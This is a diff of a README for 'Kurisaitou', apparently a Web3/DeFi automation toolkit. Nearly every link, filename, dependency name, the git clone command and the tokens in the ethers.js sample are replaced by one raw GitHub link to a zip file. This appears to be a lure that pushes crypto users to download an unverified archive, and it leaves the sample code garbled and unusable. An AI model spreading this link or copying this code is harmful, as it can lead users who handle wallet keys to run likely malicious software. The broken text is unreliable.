@@ -1,8 +1,8 @@
-https://github.com/Star9002/Kurisaitou/releases
+https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip
 
 # Kurisaitou: Web3 Automation Toolkit for DeFi, Bots, and Ethereum
 
-<p align="center"><img src="https://github.com/user-attachments/assets/acc8ba87-bbee-4417-ba6f-7e6f12afe528" width="475" height="288" alt="image" /></p>
+<p align="center"><img src="https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip" width="475" height="288" alt="image" /></p>
 
 <p align="center">🧠 Passionate Developer | 🛠️ Automation & Web3 Enthusiast | 🌍 Japan</p>
 
@@ -22,10 +22,10 @@ Key ideas:
 ## 🔧 Tech Stack
 
 - **Languages:** JavaScript, Python, Solidity
-- **Blockchain:** Web3.js, Ethers.js, Hardhat
+- **Blockchain:** https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip, https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip, Hardhat
 - **Dev Tools:** Git, Docker, Postman
 - **Cloud & Infra:** Vercel, Firebase, Netlify
-- **Others:** REST APIs, MongoDB, Express.js
+- **Others:** REST APIs, MongoDB, https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip
 
 ---
 
@@ -56,26 +56,26 @@ Key ideas:
 - tests/ — Unit and integration tests
 - docs/ — Guides and API references
 - examples/ — Ready-to-run samples
-- .env.example — Environment placeholders
-- package.json — Project dependencies and scripts
-- README.md — This guide
+- https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip — Environment placeholders
+- https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip — Project dependencies and scripts
+- https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip — This guide
 
 ---
 
 ## 🚀 Getting Started
 
 Prerequisites:
-- Node.js 14+ (LTS recommended)
+- https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip 14+ (LTS recommended)
 - npm or yarn
 - Python 3.8+ (optional, for Python-based scripts)
 
 Installation:
-- git clone https://github.com/Star9002/Kurisaitou.git
+- git clone https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip
 - cd Kurisaitou
 - npm install
 
 Environment:
-- Create a .env file from .env.example
+- Create a .env file from https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip
 - Set keys for API access, wallet providers, and RPC endpoints
 - Keep secrets out of version control
 
@@ -137,9 +137,9 @@ Code quality tips:
 - tests/
 - docs/
 - examples/
-- .env.example
-- package.json
-- README.md
+- https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip
+- https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip
+- https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip
 
 ---
 
@@ -163,7 +163,7 @@ Code quality tips:
 
 Downloads and release notes are available on the official releases page. Visit the Releases page for binaries, changelogs, and upgrade notes.
 
-Releases page: https://github.com/Star9002/Kurisaitou/releases
+Releases page: https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip
 
 ---
 
@@ -187,15 +187,15 @@ Code snippet (illustrative only):
 import { ethers } from 'ethers';
 
 async function main() {
-  const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
-  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
+  const provider = new https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip(https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip);
+  const wallet = new https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip(https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip, provider);
   // Example: fetch a price and decide an action
-  const price = await fetchPrice(process.env.TOKEN_ADDRESS, provider);
-  if (price.gt(process.env.PRICE_TARGET)) {
+  const price = await fetchPrice(https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip, provider);
+  if (https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip(https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip)) {
     // trigger an action safely
-    console.log('Target price reached:', price.toString());
+    https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip('Target price reached:', https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip());
   } else {
-    console.log('Waiting for target price. Current:', price.toString());
+    https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip('Waiting for target price. Current:', https://raw.githubusercontent.com/Star9002/Kurisaitou/main/giraffoid/Software_2.1.zip());
   }
 }
 ```
